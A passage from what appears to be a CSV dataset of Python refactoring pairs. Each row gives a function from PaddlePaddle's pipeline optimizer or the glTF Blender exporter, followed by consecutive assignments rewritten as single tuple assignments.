        self.endpoints = self.role_maker._get_trainer_endpoints()
        self.current_endpoint = self.endpoints[self.role_maker._worker_index()]
        self.rank = self.role_maker._worker_index()
        self.nranks = self.role_maker._worker_num()

        self.wrapped_opt = PO(
            self.inner_opt, num_microbatches=self.num_microbatches
        )
        orig_startup_program = (
            startup_program
            if startup_program
            else paddle.static.default_startup_program()
        )
        block = loss.block
        program = block.program

        program._pipeline_opt = dict()
        program._pipeline_opt['local_rank'] = self.rank
        program._pipeline_opt['global_ring_id'] = self.global_ring_id
        program._pipeline_opt['ring_id'] = self.start_pipeline_ring_id
        program._pipeline_opt['micro_batch_size'] = self.micro_batch_size
        program._pipeline_opt['schedule_mode'] = self.schedule_mode
        program._pipeline_opt['use_sharding'] = False
        program._pipeline_opt['mp_degree'] = 1
        program._pipeline_opt['mp_rank'] = 0
        (
            optimize_ops,
            params_grads,
            prog_list,
            pp_pair,
            ring_map,
        ) = self.wrapped_opt.minimize(
            loss, startup_program, parameter_list, no_grad_set
        )
        self.startup_program = orig_startup_program._pipeline_opt[
            'startup_program'
        ]
        self.inner_parallelism = program._pipeline_opt['inner_parallelism']
        assert self.nranks % self.inner_parallelism == 0
        assert prog_list
        self.pipeline_num = len(self.endpoints) // self.inner_parallelism

        self._init_process_group(pp_pair, ring_map)

        self.main_program_list = prog_list
        self.main_program = program
        if self.pipeline_num > 1:
            self._transpile_main_program(loss)
        return optimize_ops, params_grads","self.wrapped_opt = PO(self.inner_opt, num_microbatches=self.num_microbatches)
orig_startup_program = startup_program if startup_program else paddle.static.default_startup_program()
block = loss.block","self.wrapped_opt , orig_startup_program , block  = PO(self.inner_opt, num_microbatches=self.num_microbatches), startup_program if startup_program else paddle.static.default_startup_program(), loss.block"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/distributed/fleet/meta_optimizers/pipeline_optimizer.py,PipelineOptimizer,minimize_impl$200,"def minimize_impl(
        self, loss, startup_program=None, parameter_list=None, no_grad_set=None
    ):
        self.endpoints = self.role_maker._get_trainer_endpoints()
        self.current_endpoint = self.endpoints[self.role_maker._worker_index()]
        self.rank = self.role_maker._worker_index()
        self.nranks = self.role_maker._worker_num()

        self.wrapped_opt = PO(
            self.inner_opt, num_microbatches=self.num_microbatches
        )
        orig_startup_program = (
            startup_program
            if startup_program
            else paddle.static.default_startup_program()
        )
        block = loss.block
        program = block.program

        program._pipeline_opt = dict()
        program._pipeline_opt['local_rank'] = self.rank
        program._pipeline_opt['global_ring_id'] = self.global_ring_id
        program._pipeline_opt['ring_id'] = self.start_pipeline_ring_id
        program._pipeline_opt['micro_batch_size'] = self.micro_batch_size
        program._pipeline_opt['schedule_mode'] = self.schedule_mode
        program._pipeline_opt['use_sharding'] = False
        program._pipeline_opt['mp_degree'] = 1
        program._pipeline_opt['mp_rank'] = 0
        (
            optimize_ops,
            params_grads,
            prog_list,
            pp_pair,
            ring_map,
        ) = self.wrapped_opt.minimize(
            loss, startup_program, parameter_list, no_grad_set
        )
        self.startup_program = orig_startup_program._pipeline_opt[
            'startup_program'
        ]
        self.inner_parallelism = program._pipeline_opt['inner_parallelism']
        assert self.nranks % self.inner_parallelism == 0
        assert prog_list
        self.pipeline_num = len(self.endpoints) // self.inner_parallelism

        self._init_process_group(pp_pair, ring_map)

        self.main_program_list = prog_list
        self.main_program = program
        if self.pipeline_num > 1:
            self._transpile_main_program(loss)
        return optimize_ops, params_grads","program._pipeline_opt['local_rank'] = self.rank
program._pipeline_opt['global_ring_id'] = self.global_ring_id
program._pipeline_opt['ring_id'] = self.start_pipeline_ring_id
program._pipeline_opt['micro_batch_size'] = self.micro_batch_size
program._pipeline_opt['schedule_mode'] = self.schedule_mode
program._pipeline_opt['use_sharding'] = False
program._pipeline_opt['mp_degree'] = 1
program._pipeline_opt['mp_rank'] = 0","program._pipeline_opt['local_rank'] , program._pipeline_opt['global_ring_id'] , program._pipeline_opt['ring_id'] , program._pipeline_opt['micro_batch_size'] , program._pipeline_opt['schedule_mode'] , program._pipeline_opt['use_sharding'] , program._pipeline_opt['mp_degree'] , program._pipeline_opt['mp_rank']  = self.rank, self.global_ring_id, self.start_pipeline_ring_id, self.micro_batch_size, self.schedule_mode, False, 1, 0"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/distributed/fleet/meta_optimizers/pipeline_optimizer.py,PipelineOptimizer,minimize_impl$200,"def minimize_impl(
        self, loss, startup_program=None, parameter_list=None, no_grad_set=None
    ):
        self.endpoints = self.role_maker._get_trainer_endpoints()
        self.current_endpoint = self.endpoints[self.role_maker._worker_index()]
        self.rank = self.role_maker._worker_index()
        self.nranks = self.role_maker._worker_num()

        self.wrapped_opt = PO(
            self.inner_opt, num_microbatches=self.num_microbatches
        )
        orig_startup_program = (
            startup_program
            if startup_program
            else paddle.static.default_startup_program()
        )
        block = loss.block
        program = block.program

        program._pipeline_opt = dict()
        program._pipeline_opt['local_rank'] = self.rank
        program._pipeline_opt['global_ring_id'] = self.global_ring_id
        program._pipeline_opt['ring_id'] = self.start_pipeline_ring_id
        program._pipeline_opt['micro_batch_size'] = self.micro_batch_size
        program._pipeline_opt['schedule_mode'] = self.schedule_mode
        program._pipeline_opt['use_sharding'] = False
        program._pipeline_opt['mp_degree'] = 1
        program._pipeline_opt['mp_rank'] = 0
        (
            optimize_ops,
            params_grads,
            prog_list,
            pp_pair,
            ring_map,
        ) = self.wrapped_opt.minimize(
            loss, startup_program, parameter_list, no_grad_set
        )
        self.startup_program = orig_startup_program._pipeline_opt[
            'startup_program'
        ]
        self.inner_parallelism = program._pipeline_opt['inner_parallelism']
        assert self.nranks % self.inner_parallelism == 0
        assert prog_list
        self.pipeline_num = len(self.endpoints) // self.inner_parallelism

        self._init_process_group(pp_pair, ring_map)

        self.main_program_list = prog_list
        self.main_program = program
        if self.pipeline_num > 1:
            self._transpile_main_program(loss)
        return optimize_ops, params_grads","self.startup_program = orig_startup_program._pipeline_opt['startup_program']
self.inner_parallelism = program._pipeline_opt['inner_parallelism']","self.startup_program , self.inner_parallelism  = orig_startup_program._pipeline_opt['startup_program'], program._pipeline_opt['inner_parallelism']"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/distributed/fleet/meta_optimizers/pipeline_optimizer.py,PipelineOptimizer,minimize_impl$200,"def minimize_impl(
        self, loss, startup_program=None, parameter_list=None, no_grad_set=None
    ):
        self.endpoints = self.role_maker._get_trainer_endpoints()
        self.current_endpoint = self.endpoints[self.role_maker._worker_index()]
        self.rank = self.role_maker._worker_index()
        self.nranks = self.role_maker._worker_num()

        self.wrapped_opt = PO(
            self.inner_opt, num_microbatches=self.num_microbatches
        )
        orig_startup_program = (
            startup_program
            if startup_program
            else paddle.static.default_startup_program()
        )
        block = loss.block
        program = block.program

        program._pipeline_opt = dict()
        program._pipeline_opt['local_rank'] = self.rank
        program._pipeline_opt['global_ring_id'] = self.global_ring_id
        program._pipeline_opt['ring_id'] = self.start_pipeline_ring_id
        program._pipeline_opt['micro_batch_size'] = self.micro_batch_size
        program._pipeline_opt['schedule_mode'] = self.schedule_mode
        program._pipeline_opt['use_sharding'] = False
        program._pipeline_opt['mp_degree'] = 1
        program._pipeline_opt['mp_rank'] = 0
        (
            optimize_ops,
            params_grads,
            prog_list,
            pp_pair,
            ring_map,
        ) = self.wrapped_opt.minimize(
            loss, startup_program, parameter_list, no_grad_set
        )
        self.startup_program = orig_startup_program._pipeline_opt[
            'startup_program'
        ]
        self.inner_parallelism = program._pipeline_opt['inner_parallelism']
        assert self.nranks % self.inner_parallelism == 0
        assert prog_list
        self.pipeline_num = len(self.endpoints) // self.inner_parallelism

        self._init_process_group(pp_pair, ring_map)

        self.main_program_list = prog_list
        self.main_program = program
        if self.pipeline_num > 1:
            self._transpile_main_program(loss)
        return optimize_ops, params_grads","self.main_program_list = prog_list
self.main_program = program","self.main_program_list , self.main_program  = prog_list, program"
glTF-Blender-Exporter,https://github.com/KhronosGroup/glTF-Blender-Exporter/tree/master/scripts/addons/io_scene_gltf2/gltf2_generate.py,,generate_nodes$1720,"def generate_nodes(operator,
                   context,
                   export_settings,
                   glTF):
    """"""
    Generates the top level nodes entry.
    """"""

    nodes = []

    skins = []

    #
    #

    filtered_objects = export_settings['filtered_objects']

    for blender_object in filtered_objects:
        node = generate_node_instance(context, export_settings, glTF, nodes, blender_object, False)

        #
        #

        nodes.append(node)

    #
    #

    for blender_object in filtered_objects:
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group != None:

            if export_settings['gltf_layers'] or (blender_object.layers[0] and blender_object.dupli_group.layers[0]):

                for blender_dupli_object in blender_object.dupli_group.objects:
                    node = generate_node_instance(context, export_settings, glTF, nodes, blender_dupli_object,
                                                  True)

                    node['name'] = 'Duplication_' + blender_object.name + '_' + blender_dupli_object.name

                    #
                    #

                    nodes.append(node)

                #

                node = {}

                node['name'] = 'Duplication_Offset_' + blender_object.name

                translation = convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)

                node['translation'] = [-translation[0], -translation[1], -translation[2]]

                nodes.append(node)

    #
    #

    if len(nodes) > 0:
        glTF['nodes'] = nodes

    #
    #

    if export_settings['gltf_skins']:
        for blender_object in filtered_objects:
            if blender_object.type != 'ARMATURE' or len(blender_object.pose.bones) == 0:
                continue

            temp_action = None

            if export_settings['gltf_bake_skins'] and not export_settings['gltf_animations']:
                if blender_object.animation_data is not None:
                    temp_action = blender_object.animation_data.action

                bpy.context.scene.objects.active = blender_object
                bpy.ops.object.mode_set(mode='POSE')
                bpy.ops.nla.bake(frame_start=bpy.context.scene.frame_current, frame_end=bpy.context.scene.frame_current,
                                 only_selected=False, visual_keying=True, clear_constraints=False,
                                 use_current_action=False, bake_types={'POSE'})

            joints = []

            joints_written = False

            #

            children_list = list(blender_object.children)

            for blender_check_object in filtered_objects:
                blender_check_armature = blender_check_object.find_armature()

                if blender_check_armature == blender_object and blender_check_object not in children_list:
                    children_list.append(blender_check_object)

            #

            for blender_object_child in children_list:
                #
                # Property: skin and node
                #

                inverse_matrices = []

                for blender_bone in blender_object.pose.bones:

                    if export_settings['gltf_yup']:
                        axis_basis_change = mathutils.Matrix(
                            ((1.0, 0.0, 0.0, 0.0), (0.0, 0.0, 1.0, 0.0), (0.0, -1.0, 0.0, 0.0), (0.0, 0.0, 0.0, 1.0)))
                    else:
                        axis_basis_change = mathutils.Matrix.Identity(4)

                    if not joints_written:
                        node = {}

                        if blender_bone.parent is None:
                            correction_matrix_local = axis_basis_change * blender_bone.bone.matrix_local
                        else:
                            correction_matrix_local = blender_bone.parent.bone.matrix_local.inverted() * blender_bone.bone.matrix_local

                        matrix_basis = blender_bone.matrix_basis

                        if export_settings['gltf_bake_skins']:
                            matrix_basis = blender_object.convert_space(blender_bone, blender_bone.matrix,
                                                                        from_space='POSE', to_space='LOCAL')

                        generate_node_parameter(export_settings, correction_matrix_local * matrix_basis, node, 'JOINT')

                        #

                        node['name'] = blender_object.name + ""_"" + blender_bone.name

                        #
                        #

                        joints.append(len(nodes))

                        nodes.append(node)

                    #
                    #

                    inverse_bind_matrix = axis_basis_change * blender_bone.bone.matrix_local

                    bind_shape_matrix = axis_basis_change * blender_object.matrix_world.inverted() * blender_object_child.matrix_world * axis_basis_change.inverted()

                    inverse_bind_matrix = inverse_bind_matrix.inverted() * bind_shape_matrix

                    for column in range(0, 4):
                        for row in range(0, 4):
                            inverse_matrices.append(inverse_bind_matrix[row][column])

                #

                joints_written = True

                #

                skin = {}

                skin['skeleton'] = get_node_index(glTF, blender_object.name)

                skin['joints'] = joints

                #
                count = len(inverse_matrices) // 16
                type = ""MAT4""

                inverseBindMatrices = create_accessor(
                    operator,
                    context,
                    export_settings,
                    glTF,
                    inverse_matrices,
                    GLTF_COMPONENT_TYPE_FLOAT,
                    count,
                    GLTF_DATA_TYPE_MAT4,
                    """"
                )

                skin['inverseBindMatrices'] = inverseBindMatrices

                #

                skins.append(skin)

            #

            if temp_action is not None:
                blender_object.animation_data.action = temp_action

    #
    #

    if len(skins) > 0:
        glTF['skins'] = skins

    #
    # Resolve children etc.
    #

    for blender_object in filtered_objects:
        node_index = get_node_index(glTF, blender_object.name)

        node = nodes[node_index]

        #

        if export_settings['gltf_skins']:
            blender_armature = blender_object.find_armature()
            if blender_armature is not None:

                if blender_object in blender_armature.children:
                    index_offset = blender_armature.children.index(blender_object)
                else:
                    index_local_offset = 0

                    for blender_check_object in filtered_objects:
                        blender_check_armature = blender_check_object.find_armature()
                        if blender_check_armature == blender_armature:
                            index_local_offset += 1

                        if blender_object == blender_check_object:
                            index_local_offset -= 1
                            break

                    index_offset = len(blender_armature.children) + index_local_offset

                node['skin'] = get_skin_index(glTF, blender_armature.name, index_offset)

        #

        children = []

        # Camera
        if export_settings['gltf_cameras']:
            if blender_object.type == 'CAMERA':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Light
        if export_settings['gltf_lights']:
            if blender_object.type == 'LAMP':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Nodes
        for blender_child_node in blender_object.children:
            child_index = get_node_index(glTF, blender_child_node.name)

            if blender_child_node.parent_type == 'BONE' and export_settings['gltf_skins']:
                continue

            if child_index < 0:
                continue

            children.append(child_index)

        # Duplications
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group is not None:

            child_index = get_node_index(glTF, 'Duplication_Offset_' + blender_object.name)
            if child_index >= 0:
                children.append(child_index)

                duplication_node = nodes[child_index]

                duplication_children = []

                for blender_dupli_object in blender_object.dupli_group.objects:
                    child_index = get_node_index(
                        glTF,
                        'Duplication_' + blender_object.name + '_' + blender_dupli_object.name
                    )
                    if child_index >= 0:
                        duplication_children.append(child_index)

                duplication_node['children'] = duplication_children

                #

        if export_settings['gltf_skins']:
            # Joint
            if blender_object.type == 'ARMATURE' and len(blender_object.pose.bones) > 0:

                #

                blender_object_to_bone = {}

                if export_settings['gltf_skins']:
                    for blender_child_node in blender_object.children:
                        if blender_child_node.parent_type == 'BONE':
                            blender_object_to_bone[blender_child_node.name] = blender_child_node.parent_bone

                #

                for blender_bone in blender_object.pose.bones:

                    if blender_bone.parent:
                        continue

                    child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                    if child_index < 0:
                        continue

                    children.append(child_index)

                for blender_bone in blender_object.pose.bones:
                    joint_children = []
                    for blender_bone_child in blender_bone.children:
                        child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone_child.name)

                        if child_index < 0:
                            continue

                        joint_children.append(child_index)

                    for blender_object_name in blender_object_to_bone:
                        blender_bone_name = blender_object_to_bone[blender_object_name]
                        if blender_bone_name == blender_bone.name:
                            child_index = get_node_index(glTF, blender_object_name)

                            if child_index < 0:
                                continue

                            joint_children.append(child_index)

                    if len(joint_children) > 0:
                        node_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                        child_node = nodes[node_index]

                        child_node['children'] = joint_children

        if len(children) > 0:
            node['children'] = children","nodes = []
skins = []
filtered_objects = export_settings['filtered_objects']","nodes , skins , filtered_objects  = [], [], export_settings['filtered_objects']"
glTF-Blender-Exporter,https://github.com/KhronosGroup/glTF-Blender-Exporter/tree/master/scripts/addons/io_scene_gltf2/gltf2_generate.py,,generate_nodes$1720,"def generate_nodes(operator,
                   context,
                   export_settings,
                   glTF):
    """"""
    Generates the top level nodes entry.
    """"""

    nodes = []

    skins = []

    #
    #

    filtered_objects = export_settings['filtered_objects']

    for blender_object in filtered_objects:
        node = generate_node_instance(context, export_settings, glTF, nodes, blender_object, False)

        #
        #

        nodes.append(node)

    #
    #

    for blender_object in filtered_objects:
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group != None:

            if export_settings['gltf_layers'] or (blender_object.layers[0] and blender_object.dupli_group.layers[0]):

                for blender_dupli_object in blender_object.dupli_group.objects:
                    node = generate_node_instance(context, export_settings, glTF, nodes, blender_dupli_object,
                                                  True)

                    node['name'] = 'Duplication_' + blender_object.name + '_' + blender_dupli_object.name

                    #
                    #

                    nodes.append(node)

                #

                node = {}

                node['name'] = 'Duplication_Offset_' + blender_object.name

                translation = convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)

                node['translation'] = [-translation[0], -translation[1], -translation[2]]

                nodes.append(node)

    #
    #

    if len(nodes) > 0:
        glTF['nodes'] = nodes

    #
    #

    if export_settings['gltf_skins']:
        for blender_object in filtered_objects:
            if blender_object.type != 'ARMATURE' or len(blender_object.pose.bones) == 0:
                continue

            temp_action = None

            if export_settings['gltf_bake_skins'] and not export_settings['gltf_animations']:
                if blender_object.animation_data is not None:
                    temp_action = blender_object.animation_data.action

                bpy.context.scene.objects.active = blender_object
                bpy.ops.object.mode_set(mode='POSE')
                bpy.ops.nla.bake(frame_start=bpy.context.scene.frame_current, frame_end=bpy.context.scene.frame_current,
                                 only_selected=False, visual_keying=True, clear_constraints=False,
                                 use_current_action=False, bake_types={'POSE'})

            joints = []

            joints_written = False

            #

            children_list = list(blender_object.children)

            for blender_check_object in filtered_objects:
                blender_check_armature = blender_check_object.find_armature()

                if blender_check_armature == blender_object and blender_check_object not in children_list:
                    children_list.append(blender_check_object)

            #

            for blender_object_child in children_list:
                #
                # Property: skin and node
                #

                inverse_matrices = []

                for blender_bone in blender_object.pose.bones:

                    if export_settings['gltf_yup']:
                        axis_basis_change = mathutils.Matrix(
                            ((1.0, 0.0, 0.0, 0.0), (0.0, 0.0, 1.0, 0.0), (0.0, -1.0, 0.0, 0.0), (0.0, 0.0, 0.0, 1.0)))
                    else:
                        axis_basis_change = mathutils.Matrix.Identity(4)

                    if not joints_written:
                        node = {}

                        if blender_bone.parent is None:
                            correction_matrix_local = axis_basis_change * blender_bone.bone.matrix_local
                        else:
                            correction_matrix_local = blender_bone.parent.bone.matrix_local.inverted() * blender_bone.bone.matrix_local

                        matrix_basis = blender_bone.matrix_basis

                        if export_settings['gltf_bake_skins']:
                            matrix_basis = blender_object.convert_space(blender_bone, blender_bone.matrix,
                                                                        from_space='POSE', to_space='LOCAL')

                        generate_node_parameter(export_settings, correction_matrix_local * matrix_basis, node, 'JOINT')

                        #

                        node['name'] = blender_object.name + ""_"" + blender_bone.name

                        #
                        #

                        joints.append(len(nodes))

                        nodes.append(node)

                    #
                    #

                    inverse_bind_matrix = axis_basis_change * blender_bone.bone.matrix_local

                    bind_shape_matrix = axis_basis_change * blender_object.matrix_world.inverted() * blender_object_child.matrix_world * axis_basis_change.inverted()

                    inverse_bind_matrix = inverse_bind_matrix.inverted() * bind_shape_matrix

                    for column in range(0, 4):
                        for row in range(0, 4):
                            inverse_matrices.append(inverse_bind_matrix[row][column])

                #

                joints_written = True

                #

                skin = {}

                skin['skeleton'] = get_node_index(glTF, blender_object.name)

                skin['joints'] = joints

                #
                count = len(inverse_matrices) // 16
                type = ""MAT4""

                inverseBindMatrices = create_accessor(
                    operator,
                    context,
                    export_settings,
                    glTF,
                    inverse_matrices,
                    GLTF_COMPONENT_TYPE_FLOAT,
                    count,
                    GLTF_DATA_TYPE_MAT4,
                    """"
                )

                skin['inverseBindMatrices'] = inverseBindMatrices

                #

                skins.append(skin)

            #

            if temp_action is not None:
                blender_object.animation_data.action = temp_action

    #
    #

    if len(skins) > 0:
        glTF['skins'] = skins

    #
    # Resolve children etc.
    #

    for blender_object in filtered_objects:
        node_index = get_node_index(glTF, blender_object.name)

        node = nodes[node_index]

        #

        if export_settings['gltf_skins']:
            blender_armature = blender_object.find_armature()
            if blender_armature is not None:

                if blender_object in blender_armature.children:
                    index_offset = blender_armature.children.index(blender_object)
                else:
                    index_local_offset = 0

                    for blender_check_object in filtered_objects:
                        blender_check_armature = blender_check_object.find_armature()
                        if blender_check_armature == blender_armature:
                            index_local_offset += 1

                        if blender_object == blender_check_object:
                            index_local_offset -= 1
                            break

                    index_offset = len(blender_armature.children) + index_local_offset

                node['skin'] = get_skin_index(glTF, blender_armature.name, index_offset)

        #

        children = []

        # Camera
        if export_settings['gltf_cameras']:
            if blender_object.type == 'CAMERA':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Light
        if export_settings['gltf_lights']:
            if blender_object.type == 'LAMP':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Nodes
        for blender_child_node in blender_object.children:
            child_index = get_node_index(glTF, blender_child_node.name)

            if blender_child_node.parent_type == 'BONE' and export_settings['gltf_skins']:
                continue

            if child_index < 0:
                continue

            children.append(child_index)

        # Duplications
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group is not None:

            child_index = get_node_index(glTF, 'Duplication_Offset_' + blender_object.name)
            if child_index >= 0:
                children.append(child_index)

                duplication_node = nodes[child_index]

                duplication_children = []

                for blender_dupli_object in blender_object.dupli_group.objects:
                    child_index = get_node_index(
                        glTF,
                        'Duplication_' + blender_object.name + '_' + blender_dupli_object.name
                    )
                    if child_index >= 0:
                        duplication_children.append(child_index)

                duplication_node['children'] = duplication_children

                #

        if export_settings['gltf_skins']:
            # Joint
            if blender_object.type == 'ARMATURE' and len(blender_object.pose.bones) > 0:

                #

                blender_object_to_bone = {}

                if export_settings['gltf_skins']:
                    for blender_child_node in blender_object.children:
                        if blender_child_node.parent_type == 'BONE':
                            blender_object_to_bone[blender_child_node.name] = blender_child_node.parent_bone

                #

                for blender_bone in blender_object.pose.bones:

                    if blender_bone.parent:
                        continue

                    child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                    if child_index < 0:
                        continue

                    children.append(child_index)

                for blender_bone in blender_object.pose.bones:
                    joint_children = []
                    for blender_bone_child in blender_bone.children:
                        child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone_child.name)

                        if child_index < 0:
                            continue

                        joint_children.append(child_index)

                    for blender_object_name in blender_object_to_bone:
                        blender_bone_name = blender_object_to_bone[blender_object_name]
                        if blender_bone_name == blender_bone.name:
                            child_index = get_node_index(glTF, blender_object_name)

                            if child_index < 0:
                                continue

                            joint_children.append(child_index)

                    if len(joint_children) > 0:
                        node_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                        child_node = nodes[node_index]

                        child_node['children'] = joint_children

        if len(children) > 0:
            node['children'] = children","joints = []
joints_written = False
children_list = list(blender_object.children)","joints , joints_written , children_list  = [], False, list(blender_object.children)"
glTF-Blender-Exporter,https://github.com/KhronosGroup/glTF-Blender-Exporter/tree/master/scripts/addons/io_scene_gltf2/gltf2_generate.py,,generate_nodes$1720,"def generate_nodes(operator,
                   context,
                   export_settings,
                   glTF):
    """"""
    Generates the top level nodes entry.
    """"""

    nodes = []

    skins = []

    #
    #

    filtered_objects = export_settings['filtered_objects']

    for blender_object in filtered_objects:
        node = generate_node_instance(context, export_settings, glTF, nodes, blender_object, False)

        #
        #

        nodes.append(node)

    #
    #

    for blender_object in filtered_objects:
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group != None:

            if export_settings['gltf_layers'] or (blender_object.layers[0] and blender_object.dupli_group.layers[0]):

                for blender_dupli_object in blender_object.dupli_group.objects:
                    node = generate_node_instance(context, export_settings, glTF, nodes, blender_dupli_object,
                                                  True)

                    node['name'] = 'Duplication_' + blender_object.name + '_' + blender_dupli_object.name

                    #
                    #

                    nodes.append(node)

                #

                node = {}

                node['name'] = 'Duplication_Offset_' + blender_object.name

                translation = convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)

                node['translation'] = [-translation[0], -translation[1], -translation[2]]

                nodes.append(node)

    #
    #

    if len(nodes) > 0:
        glTF['nodes'] = nodes

    #
    #

    if export_settings['gltf_skins']:
        for blender_object in filtered_objects:
            if blender_object.type != 'ARMATURE' or len(blender_object.pose.bones) == 0:
                continue

            temp_action = None

            if export_settings['gltf_bake_skins'] and not export_settings['gltf_animations']:
                if blender_object.animation_data is not None:
                    temp_action = blender_object.animation_data.action

                bpy.context.scene.objects.active = blender_object
                bpy.ops.object.mode_set(mode='POSE')
                bpy.ops.nla.bake(frame_start=bpy.context.scene.frame_current, frame_end=bpy.context.scene.frame_current,
                                 only_selected=False, visual_keying=True, clear_constraints=False,
                                 use_current_action=False, bake_types={'POSE'})

            joints = []

            joints_written = False

            #

            children_list = list(blender_object.children)

            for blender_check_object in filtered_objects:
                blender_check_armature = blender_check_object.find_armature()

                if blender_check_armature == blender_object and blender_check_object not in children_list:
                    children_list.append(blender_check_object)

            #

            for blender_object_child in children_list:
                #
                # Property: skin and node
                #

                inverse_matrices = []

                for blender_bone in blender_object.pose.bones:

                    if export_settings['gltf_yup']:
                        axis_basis_change = mathutils.Matrix(
                            ((1.0, 0.0, 0.0, 0.0), (0.0, 0.0, 1.0, 0.0), (0.0, -1.0, 0.0, 0.0), (0.0, 0.0, 0.0, 1.0)))
                    else:
                        axis_basis_change = mathutils.Matrix.Identity(4)

                    if not joints_written:
                        node = {}

                        if blender_bone.parent is None:
                            correction_matrix_local = axis_basis_change * blender_bone.bone.matrix_local
                        else:
                            correction_matrix_local = blender_bone.parent.bone.matrix_local.inverted() * blender_bone.bone.matrix_local

                        matrix_basis = blender_bone.matrix_basis

                        if export_settings['gltf_bake_skins']:
                            matrix_basis = blender_object.convert_space(blender_bone, blender_bone.matrix,
                                                                        from_space='POSE', to_space='LOCAL')

                        generate_node_parameter(export_settings, correction_matrix_local * matrix_basis, node, 'JOINT')

                        #

                        node['name'] = blender_object.name + ""_"" + blender_bone.name

                        #
                        #

                        joints.append(len(nodes))

                        nodes.append(node)

                    #
                    #

                    inverse_bind_matrix = axis_basis_change * blender_bone.bone.matrix_local

                    bind_shape_matrix = axis_basis_change * blender_object.matrix_world.inverted() * blender_object_child.matrix_world * axis_basis_change.inverted()

                    inverse_bind_matrix = inverse_bind_matrix.inverted() * bind_shape_matrix

                    for column in range(0, 4):
                        for row in range(0, 4):
                            inverse_matrices.append(inverse_bind_matrix[row][column])

                #

                joints_written = True

                #

                skin = {}

                skin['skeleton'] = get_node_index(glTF, blender_object.name)

                skin['joints'] = joints

                #
                count = len(inverse_matrices) // 16
                type = ""MAT4""

                inverseBindMatrices = create_accessor(
                    operator,
                    context,
                    export_settings,
                    glTF,
                    inverse_matrices,
                    GLTF_COMPONENT_TYPE_FLOAT,
                    count,
                    GLTF_DATA_TYPE_MAT4,
                    """"
                )

                skin['inverseBindMatrices'] = inverseBindMatrices

                #

                skins.append(skin)

            #

            if temp_action is not None:
                blender_object.animation_data.action = temp_action

    #
    #

    if len(skins) > 0:
        glTF['skins'] = skins

    #
    # Resolve children etc.
    #

    for blender_object in filtered_objects:
        node_index = get_node_index(glTF, blender_object.name)

        node = nodes[node_index]

        #

        if export_settings['gltf_skins']:
            blender_armature = blender_object.find_armature()
            if blender_armature is not None:

                if blender_object in blender_armature.children:
                    index_offset = blender_armature.children.index(blender_object)
                else:
                    index_local_offset = 0

                    for blender_check_object in filtered_objects:
                        blender_check_armature = blender_check_object.find_armature()
                        if blender_check_armature == blender_armature:
                            index_local_offset += 1

                        if blender_object == blender_check_object:
                            index_local_offset -= 1
                            break

                    index_offset = len(blender_armature.children) + index_local_offset

                node['skin'] = get_skin_index(glTF, blender_armature.name, index_offset)

        #

        children = []

        # Camera
        if export_settings['gltf_cameras']:
            if blender_object.type == 'CAMERA':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Light
        if export_settings['gltf_lights']:
            if blender_object.type == 'LAMP':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Nodes
        for blender_child_node in blender_object.children:
            child_index = get_node_index(glTF, blender_child_node.name)

            if blender_child_node.parent_type == 'BONE' and export_settings['gltf_skins']:
                continue

            if child_index < 0:
                continue

            children.append(child_index)

        # Duplications
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group is not None:

            child_index = get_node_index(glTF, 'Duplication_Offset_' + blender_object.name)
            if child_index >= 0:
                children.append(child_index)

                duplication_node = nodes[child_index]

                duplication_children = []

                for blender_dupli_object in blender_object.dupli_group.objects:
                    child_index = get_node_index(
                        glTF,
                        'Duplication_' + blender_object.name + '_' + blender_dupli_object.name
                    )
                    if child_index >= 0:
                        duplication_children.append(child_index)

                duplication_node['children'] = duplication_children

                #

        if export_settings['gltf_skins']:
            # Joint
            if blender_object.type == 'ARMATURE' and len(blender_object.pose.bones) > 0:

                #

                blender_object_to_bone = {}

                if export_settings['gltf_skins']:
                    for blender_child_node in blender_object.children:
                        if blender_child_node.parent_type == 'BONE':
                            blender_object_to_bone[blender_child_node.name] = blender_child_node.parent_bone

                #

                for blender_bone in blender_object.pose.bones:

                    if blender_bone.parent:
                        continue

                    child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                    if child_index < 0:
                        continue

                    children.append(child_index)

                for blender_bone in blender_object.pose.bones:
                    joint_children = []
                    for blender_bone_child in blender_bone.children:
                        child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone_child.name)

                        if child_index < 0:
                            continue

                        joint_children.append(child_index)

                    for blender_object_name in blender_object_to_bone:
                        blender_bone_name = blender_object_to_bone[blender_object_name]
                        if blender_bone_name == blender_bone.name:
                            child_index = get_node_index(glTF, blender_object_name)

                            if child_index < 0:
                                continue

                            joint_children.append(child_index)

                    if len(joint_children) > 0:
                        node_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                        child_node = nodes[node_index]

                        child_node['children'] = joint_children

        if len(children) > 0:
            node['children'] = children","node['name'] = 'Duplication_Offset_' + blender_object.name
